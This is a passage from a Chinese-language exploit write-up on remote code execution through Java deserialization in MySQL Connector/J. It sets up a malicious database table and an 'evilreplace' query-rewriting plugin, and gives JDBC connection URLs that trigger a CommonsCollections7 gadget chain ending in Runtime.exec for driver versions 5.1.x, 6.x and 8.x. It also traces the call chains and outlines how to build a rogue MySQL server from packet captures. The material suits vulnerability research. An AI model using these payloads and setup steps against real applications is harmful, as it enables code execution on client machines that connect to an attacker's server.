    SHOW GRANTS FOR root;
    GRANT ALL ON evildb.eviltable TO 'root'@'%';
    REVOKE ALL ON evildb.eviltable FROM 'root'@'%';
evil_1、evil_3也可以用blob类型，填充同样的@obj，触发点略有差异。上面演示的 恶意表是最小集，通吃。
### 用evilreplace插件改变SQL查询语句
用evilreplace插件将来自客户端的:
  * SHOW SESSION STATUS
  * SHOW COLLATION
替换成:select evil_1,evil_2,evil_3 from evildb.eviltable limit 1;
参[3]，这是codeplutos的思路，很有想像力，他用了自编译rewrite_example.so。
INSTALL PLUGIN evilreplace SONAME 'evilreplace.so';
  * SHOW SESSION STATUS;
  * SHOW COLLATION;
  * UNINSTALL PLUGIN evilreplace;
### JDBCClient.java
    /*
     * javac -encoding GBK -g JDBCClient.java
     */
    import java.io.*;
    import java.sql.*;
    public class JDBCClient
    {
        public static void main ( String[] argv ) throws Exception
        {
            String      url     = argv[0];
            Connection  conn    = DriverManager.getConnection( url );
        }
    }
JDBCClient.java无需显式代码:
Class.forName( "com.mysql.cj.jdbc.Driver" );
### MySQL Connector/J 各版本所需URL(ServerStatusDiffInterceptor)
参[4]、[5]、[6]，fnmsd分析了各种版本所需URL。
#### 8.x
    java \
    -cp "mysql-connector-java-8.0.14.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
##### 简化版调用关系
    DriverManager.getConnection                                         // 8u232+8.0.14
      DriverManager.getConnection                                       // DriverManager:270
        NonRegisteringDriver.connect                                    // DriverManager:664
          ConnectionImpl.getInstance                                    // NonRegisteringDriver:199
            ConnectionImpl.                                       // ConnectionImpl:240
              ConnectionImpl.initializeSafeQueryInterceptors            // ConnectionImpl:448
              ConnectionImpl.createNewIO                                // ConnectionImpl:455
                ConnectionImpl.connectOneTryOnly                        // ConnectionImpl:825
                  ConnectionImpl.initializePropsFromServer              // ConnectionImpl:966
                    ConnectionImpl.handleAutoCommitDefaults             // ConnectionImpl:1327
                      ConnectionImpl.setAutoCommit                      // ConnectionImpl:1382
                        NativeSession.execSQL                           // ConnectionImpl:2064
                                                                        // 查询语句"SET autocommit=1"
                          NativeProtocol.sendQueryString                // NativeSession:1154
                            NativeProtocol.sendQueryPacket              // NativeProtocol:921
                              if (this.queryInterceptors != null)       // NativeProtocol:969
                              NativeProtocol.invokeQueryInterceptorsPre // NativeProtocol:970
                                NoSubInterceptorWrapper.preProcess      // NativeProtocol:1144
                                  ServerStatusDiffInterceptor.preProcess
                                                                        // NoSubInterceptorWrapper:76
                                    ServerStatusDiffInterceptor.populateMapWithSessionStatusValues
                                                                        // ServerStatusDiffInterceptor:105
                                      rs = stmt.executeQuery("SHOW SESSION STATUS")
                                                                        // ServerStatusDiffInterceptor:86
                                                                        // 自动提交SQL查询
                                      ResultSetUtil.resultSetToMap      // ServerStatusDiffInterceptor:87
                                        ResultSetImpl.getObject         // ResultSetUtil:46
                                                                        // mappedValues.put(rs.getObject(1), rs.getObject(2))
                                                                        // 处理结果集中第1、2列
                                          if ((field.isBinary()) || (field.isBlob()))
                                                                        // ResultSetImpl:1314
                                          byte[] data = getBytes(columnIndex)
                                                                        // ResultSetImpl:1315
                                          if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue())
                                                                        // ResultSetImpl:1317
                                                                        // 要求autoDeserialize等于true
                                          ObjectInputStream.readObject  // ResultSetImpl:1326
                                                                        // obj = objIn.readObject();
                                            Hashtable.readObject        // ysoserial/CommonsCollections7
                                              Hashtable.reconstitutionPut
                                                AbstractMapDecorator.equals
                                                  AbstractMap.equals
                                                    LazyMap.get         // 此处开始LazyMap利用链
                                                      ChainedTransformer.transform
                                                        InvokerTransformer.transform
                                                          Runtime.exec
                              if (this.queryInterceptors != null)       // NativeProtocol:1109
                              NativeProtocol.invokeQueryInterceptorsPost
                                                                        // NativeProtocol:1110
##### mysql-connector-java-8.0.14.pcap
请自行抓包，此处略
#### 5.2) 6.x
queryInterceptors => statementInterceptors
    java \
    -cp "mysql-connector-java-6.0.3.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
5.2.2) mysql-connector-java-6.0.3.pcap
请自行抓包，此处略
#### 5.3) 5.1.11及以上版本
com.mysql.cj. => com.mysql.
    java \
    -cp "mysql-connector-java-5.1.40.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"
##### 5.3.2) mysql-connector-java-5.1.40.pcap
请自行抓包，此处略
#### 6) MySQL Connector/J 各版本所需URL(detectCustomCollations)
参[3]，触发方式是codeplutos提供的。重点看这个函数:
com.mysql.jdbc.ConnectionImpl.buildCollationMapping()
参[4]、[5]、[6]，fnmsd分析了各种版本所需URL。
##### 6.1) 5.1.29-5.1.40
    java \
    -cp "mysql-connector-java-5.1.40.jar:commons-collections-3.1.jar:." \
    JDBCClient "jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
    autoDeserialize=true&detectCustomCollations=true"
会抛异常，但恶意代码已被执行。
##### 6.1.1) 简化版调用关系
    DriverManager.getConnection                                         // 8u232+5.1.40
      DriverManager.getConnection                                       // DriverManager:270
        NonRegisteringDriver.connect                                    // DriverManager:664
          ConnectionImpl.getInstance                                    // NonRegisteringDriver:328
            Util.handleNewInstance                                      // ConnectionImpl:410
              Constructor.newInstance                                   // Util:425
                JDBC4Connection.
                  ConnectionImpl.                                 // JDBC4Connection:47
                    ConnectionImpl.initializeSafeStatementInterceptors  // ConnectionImpl:805
                    ConnectionImpl.createNewIO                          // ConnectionImpl:806
                      ConnectionImpl.connectOneTryOnly                  // ConnectionImpl:2083
                        ConnectionImpl.initializePropsFromServer        // ConnectionImpl:2297
                          if (versionMeetsMinimum(3, 21, 22))           // ConnectionImpl:3282
                          ConnectionImpl.buildCollationMapping          // ConnectionImpl:3291
                            if ((versionMeetsMinimum(4, 1, 0)) && (getDetectCustomCollations()))
                                                                        // ConnectionImpl:944
                                                                        // 5.1.28版只检查版本号，未检查detectCustomCollations属性
                            results = stmt.executeQuery("SHOW COLLATION")
                                                                        // ConnectionImpl:957
                                                                        // 自动提交SQL查询
                            if (versionMeetsMinimum(5, 0, 0))           // ConnectionImpl:958
                            Util.resultSetToMap                         // ConnectionImpl:959
                                                                        // Util.resultSetToMap(sortedCollationMap, results, 3, 2)
                                                                        // 处理结果集中第3、2列
                              ResultSetImpl.getObject                   // Util:474
                                                                        // mappedValues.put(rs.getObject(key), rs.getObject(value))
                                ResultSetImpl.getObjectDeserializingIfNeeded
                                                                        // ResultSetImpl:4544
                                  byte[] data = getBytes(columnIndex)   // ResultSetImpl:4568
                                  ObjectInputStream.readObject          // ResultSetImpl:4579
                                                                        // obj = objIn.readObject()
                                    Hashtable.readObject                // ysoserial/CommonsCollections7
                                      Hashtable.reconstitutionPut
                                        AbstractMapDecorator.equals
                                          AbstractMap.equals
                                            LazyMap.get                 // 此处开始LazyMap利用链
                                              ChainedTransformer.transform
                                                InvokerTransformer.transform
                                                  Runtime.exec
##### 6.1.2) mysql-connector-java-5.1.40_d.pcap
请自行抓包，此处略
#### 6.2) 5.1.19-5.1.28
不需要指定"detectCustomCollations=true"
java \ -cp "mysql-connector-java-5.1.19.jar:commons-collections-3.1.jar:." \
JDBCClient
"jdbc:mysql://192.168.65.23:3306/evildb?useSSL=false&user=root&password=123456&\
autoDeserialize=true"
##### 6.2.2) mysql-connector-java-5.1.19_d.pcap
请自行抓包，此处略
### 7) Python版恶意服务端
#### 7.1) fnmsd的实现
他这个实现同时支持ServerStatusDiffInterceptor、detectCustomCollations，还
支持"恶意MySQL Server读取MySQL Client端文件"，只需要Python3。
他在"踩过的坑"里写了一些值得注意的点，有兴趣者可以看他的源码。
#### 7.2) 其他思路
fnmsd的实现，功能完备。如果只是想搞标题所说漏洞，我说个别的思路。可以基于
Gifts版本实现反序列化恶意服务端:
ServerStatusDiffInterceptor适用范围包含detectCustomCollations适用范围，为
了减少麻烦，可以只支持ServerStatusDiffInterceptor。具体来说，就是只特殊响 应"SHOW SESSION
STATUS"，不特殊响应"SHOW COLLATION"。
基于三次抓包组织响应报文:
mysql-connector-java-5.1.40.pcap  
mysql-connector-java-6.0.3.pcap  
mysql-connector-java-8.0.14.pcap
要点如下:
    5.1.11及以上版本
    6.x
        特殊响应"SHOW SESSION STATUS"，然后必须特殊响应随后而来的
        "SHOW WARNINGS"。
    8.x
        按抓包所示响应初始查询:
        /* mysql-connector-java-8.0.14 (Revision: 36534fa273b4d7824a8668ca685465cf8eaeadd9) */SELECT ...
        然后按抓包所示响应随后而来的"SHOW WARNINGS"。
        特殊响应"SHOW SESSION STATUS"，然后必须特殊响应随后而来的
        "SHOW WARNINGS"。
这种搞法的好处是不用特别理解MySQL私有协议，fnmsd"踩过的坑"你都不会碰上。
十多年前我们按协议规范组织SMB报文时，有天看到某人在PoC里用了一个变量名，叫
sendcode，他实际是把Ethereal抓包看到数据直接投放出来。当时我们很震惊，不是 佩服得震惊。后来觉得某些场景下这样干，也没什么可鄙视的。
基于三次抓包组织响应报文的思路，跟sendcode异曲同工，比你想像得要通用。
当然，如果不是特别好奇，还是用fnmsd的实现吧。
## 参考链接
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
  7. 
  8. 
  9. 
  10. 
  11. 
  12. 
  13. 
* * *